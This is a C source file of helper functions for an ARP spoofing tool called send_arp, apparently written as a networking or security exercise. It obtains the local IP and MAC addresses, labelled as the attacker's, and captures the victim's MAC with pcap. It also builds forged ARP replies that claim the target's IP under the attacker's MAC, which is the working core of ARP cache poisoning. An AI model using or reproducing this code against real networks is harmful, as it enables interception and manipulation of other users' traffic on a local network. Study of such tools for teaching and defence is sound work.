/* Copyright © 2018 James Sung. All rights reserved. */

#include "functions.h"


void PRINT_USAGE(void)
{
	printf("[-] Wrong usage!\n");
	printf("[-] syntax: send_arp <interface> <sender ip> <target ip>\n");
	printf("[-] sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
	return;
}

void GET_MY_IP(char *attacker_IP_char, char *interface)
{
	int n;
	struct ifreq ifr;

	n = socket(AF_INET, SOCK_DGRAM, 0);
	
	ifr.ifr_addr.sa_family = AF_INET;
	
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
	ioctl(n, SIOCGIFADDR, &ifr);
	close(n);

	strcpy(attacker_IP_char, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
	return;
}

void PRINT_IP(char *IP_char)
{
	printf("%s", IP_char);
	return;
}

void GET_MY_MAC(uint8_t *attacker_MAC_array, char *interface)
{
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	
	strcpy(s.ifr_name, interface);
	if (!ioctl(fd, SIOCGIFHWADDR, &s))
	{
		memcpy(attacker_MAC_array, s.ifr_addr.sa_data, 6 * sizeof(uint8_t));
	}

	return;
}

void PRINT_MAC(uint8_t *MAC_array)
{
	for (int i = 0; i < 6; i++)
	{ if (i) printf(":"); printf("%02x", MAC_array[i]); }
	return;
}

void MAKE_ARPREQ_STRUCT(my_etharp_hdr *arp_struct, uint8_t *source_MAC_array, uint32_t source_IP_int, uint32_t destination_IP_int)
{
	memset(arp_struct->DMAC, 0xFF, 6 * sizeof(uint8_t));
	memcpy(arp_struct->SMAC, source_MAC_array, 6 * sizeof(uint8_t));
	arp_struct->ETHTYPE = htons(ETHERTYPE_ARP);

	(arp_struct->ARPHDR).HTYPE = htons(ARPHRD_ETHER);
	(arp_struct->ARPHDR).PTYPE = htons(ETHERTYPE_IP);
	(arp_struct->ARPHDR).HLEN  = ARP_HLEN_ETH;
	(arp_struct->ARPHDR).PLEN  = ARP_PLEN_IP;
	(arp_struct->ARPHDR).OPER  = htons(ARPOP_REQUEST);
	memcpy((arp_struct->ARPHDR).SHA, source_MAC_array, 6 * sizeof(uint8_t));
	(arp_struct->ARPHDR).SPA = source_IP_int;
	memset((arp_struct->ARPHDR).THA, 0x00, 6 * sizeof(uint8_t));
	(arp_struct->ARPHDR).TPA = destination_IP_int;
	
	return;
}

void MAKE_ARPREP_STRUCT(my_etharp_hdr *arp_struct, uint8_t *source_MAC_array, uint32_t source_IP_int, uint8_t *destination_MAC_array, uint32_t destination_IP_int, uint32_t target_IP_int)
{
	memcpy(arp_struct->DMAC, destination_MAC_array, 6 * sizeof(uint8_t));
	memcpy(arp_struct->SMAC, source_MAC_array, 6 * sizeof(uint8_t));
	arp_struct->ETHTYPE = htons(ETHERTYPE_ARP);

	(arp_struct->ARPHDR).HTYPE = htons(ARPHRD_ETHER);
	(arp_struct->ARPHDR).PTYPE = htons(ETHERTYPE_IP);
	(arp_struct->ARPHDR).HLEN  = ARP_HLEN_ETH;
	(arp_struct->ARPHDR).PLEN  = ARP_PLEN_IP;
	(arp_struct->ARPHDR).OPER  = htons(ARPOP_REPLY);
	memcpy((arp_struct->ARPHDR).SHA, source_MAC_array, 6 * sizeof(uint8_t));
	(arp_struct->ARPHDR).SPA = target_IP_int;
	memcpy((arp_struct->ARPHDR).THA, destination_MAC_array, 6 * sizeof(uint8_t));
	(arp_struct->ARPHDR).TPA = destination_IP_int;

	return;
}

void STRUCT2PACKET(uint8_t *arp_packet, my_etharp_hdr *arp_struct)
{
	memcpy(arp_packet, arp_struct, sizeof(my_etharp_hdr));
	return;
}

int GET_SENDER_MAC(uint8_t *sender_MAC_array, int sender_IP_int, pcap_t *handle, struct pcap_pkthdr *header, const uint8_t *packet)
{
	while (1)
	{
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0)               { continue; }
		if (res == -1 || res == -2) { return 0; }

		uint16_t PCKT_ETHERTYPE = (packet[12] << 8) | packet[13];
		if (PCKT_ETHERTYPE != ETHERTYPE_ARP) { continue; }

		uint16_t PCKT_ARPOP = (packet[20] << 8) | packet[21];
		if (PCKT_ARPOP != ARPOP_REPLY) { continue; }

		uint32_t PCKT_ARPSPA = (packet[31] << 24) | (packet[30] << 16) | (packet[29] << 8) | (packet[28]);
		if (PCKT_ARPSPA != sender_IP_int) { continue; }
		
		memcpy(sender_MAC_array, (packet + 22), 6 * sizeof(uint8_t));
		
		break;
	}
	
	return 1; 
}

